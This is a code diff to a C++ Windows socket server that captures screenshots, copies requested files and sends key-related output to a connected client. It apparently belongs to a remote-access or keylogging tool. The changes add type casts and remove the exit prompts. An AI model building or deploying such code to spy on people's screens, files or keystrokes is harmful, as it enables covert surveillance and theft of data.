@@ -187,13 +187,13 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
 // Function to send a screenshot image to the client
 void Server::sendScreenshot(SOCKET clientSocket, const std::string &filePath) {
     std::vector<unsigned char> imageData = captureScreenshot();
-    uint32_t dataSize = htonl(imageData.size());
+    uint32_t dataSize = htonl(static_cast<u_long>(imageData.size()));
 
     // Send size first
     send(clientSocket, reinterpret_cast<const char*>(&dataSize), sizeof(dataSize), 0);
 
     // Send image data
-    send(clientSocket, reinterpret_cast<const char*>(imageData.data()), imageData.size(), 0);
+    send(clientSocket, reinterpret_cast<const char*>(imageData.data()), static_cast<int>(imageData.size()), 0);
 }
 
 
@@ -246,8 +246,8 @@ void Server::handleClient(SOCKET clientSocket) {
             // sendScreenshot(clientSocket, "screenshot.png");
             sendScreenshot(clientSocket, "screenshot.png");
 
-            std::cout << "Press enter to exit!";
-            std::cin.get();
+            // std::cout << "Press enter to exit!";
+            // std::cin.get();
 
             closesocket(listenSocket);  // Close listening socket to stop accepting new connections
             exit(0);  // Exit the server program
@@ -265,8 +265,8 @@ void Server::handleClient(SOCKET clientSocket) {
             // Call the method to copy the file and send it back
             copyFileAndSend(clientSocket, sourceFileName, destinationFileName);
 
-            std::cout << "Press enter to exit!";
-            std::cin.get();
+            // std::cout << "Press enter to exit!";
+            // std::cin.get();
 
             closesocket(listenSocket);  // Close listening socket to stop accepting new connections
             exit(0);  // Exit the server program
@@ -283,15 +283,15 @@ void Server::copyFileAndSend(SOCKET clientSocket, const std::string& sourceFileN
     std::ifstream sourceFile(sourceFileName, std::ios::binary);
     if (!sourceFile) {
         std::string errorMessage = "Failed to open source file: " + sourceFileName;
-        send(clientSocket, errorMessage.c_str(), errorMessage.size(), 0);
+        send(clientSocket, errorMessage.c_str(), static_cast<int>(errorMessage.size()), 0);
         return;
     }
-
+    
     // Create the destination file for writing
     std::ofstream destinationFile(destinationFileName, std::ios::binary);
     if (!destinationFile) {
         std::string errorMessage = "Failed to create destination file: " + destinationFileName;
-        send(clientSocket, errorMessage.c_str(), errorMessage.size(), 0);
+        send(clientSocket, errorMessage.c_str(), static_cast<int>(errorMessage.size()), 0);
         return;
     }
 
@@ -311,17 +311,17 @@ void Server::copyFileAndSend(SOCKET clientSocket, const std::string& sourceFileN
         copiedFile.seekg(0, std::ios::beg);
 
         // Send the size first
-        uint32_t fileSize = htonl(size);
+        uint32_t fileSize = htonl(static_cast<u_long>(size));
         send(clientSocket, reinterpret_cast<const char*>(&fileSize), sizeof(fileSize), 0);
 
         // Send the file data
         char buffer[4096];
         while (copiedFile.read(buffer, sizeof(buffer))) {
-            send(clientSocket, buffer, copiedFile.gcount(), 0);
+            send(clientSocket, buffer, static_cast<int>(copiedFile.gcount()), 0);
         }
         // Send any remaining bytes
         if (copiedFile.gcount() > 0) {
-            send(clientSocket, buffer, copiedFile.gcount(), 0);
+            send(clientSocket, buffer, static_cast<int>(copiedFile.gcount()), 0);
         }
 
         std::cout << "File copied and sent back to client successfully." << std::endl;
@@ -438,7 +438,7 @@ void Server::readKey(int _key, SOCKET clientSocket) {
                 break;
         }
     }
-    send(clientSocket, output, strlen(output), 0);
+    send(clientSocket, output, static_cast<int>(strlen(output)), 0);
    
 }
 
